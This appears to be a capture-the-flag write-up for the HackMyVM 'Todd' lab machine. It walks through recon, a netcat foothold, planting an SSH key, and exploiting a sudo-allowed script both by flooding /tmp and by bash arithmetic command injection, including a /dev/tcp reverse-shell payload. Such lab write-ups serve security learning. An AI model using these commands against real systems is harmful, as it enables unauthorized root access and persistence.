@@ -1,0 +1,217 @@
+---
+title: Todd
+date: '2025-04-16'
+description: ''
+type: writeup
+platform: hackmyvm
+tags:
+  - Easy
+  - LINUX
+cover: /mc/uploads/2025/04/99642e11b3be4aac2247ad4f7dd4c53b.jpg
+---
+
+# بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ
+
+
+Hi! Sorry for the delay—I was a bit caught up with some university work. But let’s get back into hacking! Today, we’ll be tackling an easy machine on HackMyVM called Todd. As usual, we’ll start with reconnaissance using Nmap.
+
+## Recon
+
+### First Nmap Scan
+
+```bash
+$ nmap -sV -sC -p- 192.168.56.135 -A
+
+PORT      STATE SERVICE    VERSION
+22/tcp    open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+80/tcp    open  http       Apache httpd 2.4.59 ((Debian))
+2519/tcp  open  tcpwrapped
+4470/tcp  open  tcpwrapped
+...
+```
+We notice ports `22` (SSH) and `80` (HTTP) are open, along with several others that are `tcpwrapped`.
+
+### Second Nmap Scan
+
+I ran Nmap again and noticed new ports appeared, especially one interesting port: `7066`.
+
+```bash
+$ nmap -sV -p- 192.168.56.135
+-----------
+PORT      STATE SERVICE    VERSION
+22/tcp    open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+80/tcp    open  http       Apache httpd 2.4.59 ((Debian))
+7066/tcp  open  unknown
+...
+```
+I ran the Nmap scan again a **third** and **fourth time**, just to be sure. So now, along with ports `22` and `80`, there’s this **mysterious 7066** that wasn't there before. This caught my attention, so I decided to investigate.
+
+I tried connecting to it using **Netcat**, But sometimes it worked, and other times I got:
+
+```bash
+nc 192.168.56.135 7066
+(UNKNOWN) [192.168.56.135] 7066 (?) : Connection refused
+```
+⚠️ **I skipped doing directory brute-force on the website, but note that visiting `http:///tools` reveals helpful scripts** **like pspy64 and linpeas.sh , If you're wondering *why* the connection to port 7066 is getting corrupted or refused sometimes,** **pspy64 can reveal the script or command that's responsible**.
+
+## Exploiting the Port
+
+To deal with the on/off behavior of port 7066, I created a loop that keeps trying to connect:
+
+```bash
+$ while true;do nc 192.168.56.135 7066;done
+
+(UNKNOWN) [192.168.56.135] 7066 (?) : Connection refused
+(UNKNOWN) [192.168.56.135] 7066 (?) : Connection refused
+whoami
+todd
+
+```
+## Foothold – SSH Access
+
+Since the port may close again, it's better to get **access** via SSH. Let’s check if we can log in as `todd` using an SSH key.
+
+There was **no `.ssh` folder**, so I created one:
+
+```bash
+cd /home/todd 
+mkdir .ssh
+```
+Now, on our attacker machine, generate an SSH key:
+
+```bash
+ssh-keygen -t rsa -f attacker
+```
+Take the contents of `attacker.pub` and add it to `authorized_keys` on the target machine:
+
+```bash
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCOd2qBPt87qsYOMlBoxpn6uTqyKwHLIXcNj8eO.... kali@kali" > .ssh/authorized_keys
+```
+Now SSH in:
+
+```bash
+ssh todd@192.168.56.135 -i attack
+Linux todd 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+$ whoami
+todd
+```
+And we're in 😎
+
+## Priv esclation 
+
+While poking around the system, I noticed something odd: sometimes the SSH session would randomly get closed with this message:
+
+```bash
+Connection to 192.168.56.135 closed by remote host.
+```
+so lets check what the `todd` user could do with `sudo`:
+
+```bash
+$sudo -l
+------------------
+Matching Defaults entries for todd on todd:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User todd may run the following commands on todd:
+    (ALL : ALL) NOPASSWD: /bin/bash /srv/guess_and_check.sh
+    (ALL : ALL) NOPASSWD: /usr/bin/rm
+    (ALL : ALL) NOPASSWD: /usr/sbin/reboot
+```
+The interesting part is this script:
+
+```bash
+/bin/bash /srv/guess_and_check.sh
+```
+### Reviewing the Script: `guess_and_check.sh`
+
+```bash
+# check this script used by human 
+a=$((RANDOM%1000))
+echo "Please Input [$a]"
+
+echo "[+] Check this script used by human."
+echo "[+] Please Input Correct Number:"
+read -p ">>>" input_number
+
+[[ $input_number -ne "$a" ]] && exit 1
+
+sleep 0.2
+true_file="/tmp/$((RANDOM%1000))"
+sleep 1
+false_file="/tmp/$((RANDOM%1000))"
+
+[[ -f "$true_file" ]] && [[ ! -f "$false_file" ]] && cat /root/.cred || exit 2
+```
+### Understanding the Logic
+
+the script:
+
+- Generates a random number `a` between 0 and 999 and waits for user input.
+- If your input doesn't match, it exits.
+- Then it creates two file paths in `/tmp/`, one as `true_file` and one as `false_file`.
+- If `true_file` **exists**, and `false_file` **does NOT**, it prints `/root/.cred`.
+
+Since the file names are based on random numbers from 0–999, we can increase our chances by **creating a bunch of dummy files** in `/tmp`—this way, there's a high probability that `true_file` exists and `false_file` doesn’t.
+
+```bash
+for i in {1..600}; do touch /tmp/$i ;done
+```
+just keep running the vulnerable script and finally we could read the file
+
+```bash
+sudo /bin/bash /srv/guess_and_check.sh:
+
+Please Input [551]
+[+] Check this script used by human.
+[+] Please Input Correct Number:
+>>>551
+fa###########
+```
+Use the result to switch to root:
+
+```bash
+su
+Password:  # content of /root/.cred
+root@todd:/home/todd#
+```
+
+## Bonus: Command Injection — Getting a Root Shell Instantly
+
+i think there is another way to exploit this script , like command injection . bcs there is Input Correct Number and ,i think we can execute a malicious code like a rev shell so we can get a root shell , i tried too many time and it works we can do execute a command inside a brace like :
+
+```bash
+Please Input [316]
+[+] Check this script used by human.
+[+] Please Input Correct Number:
+>>>N[$(cat /root/root.txt)]
+/srv/guess_and_check.sh: line 35: Todd{389c99XXXXXXXXXX}: syntax error: invalid arithmetic operator (error token is "{389c9XXXXXXXXXX}")
+```
+for root shell :
+
+```bash
+Please Input [316]
+[+] Check this script used by human.
+[+] Please Input Correct Number:
+>>>N[$(/bin/bash -i >& /dev/tcp/192.168.56.105/9001 0>&1)]
+
+```
+setup a listener :
+
+```bash
+$ nc -vlnp 9001
+listening on [any] 9001 ...
+connect to [192.168.56.105] from (UNKNOWN) [192.168.56.135] 48898
+root@todd:/home/todd# 
+```
+**ROOTED**
+
+### My Explanation for Command Injection
+
+When we input `N[$(cat /root/root.txt)]`, Bash interprets it within an arithmetic context. This changes the command to because this part `"cat /root/root.txt`"execute first `[[ N[content_of_flag] -ne 316 ]]`. Bash tries to interpret `N[content_of_flag]` as an array index, but since it contains something like `Todd{content_of_flag}`, the part inside the curly braces is not a valid arithmetic expression. This causes Bash to throw an error: `invalid arithmetic operator (error token is "{389c99...}")`. This error reveals the content of the flag, which is unintended behavior. hope u understand :)
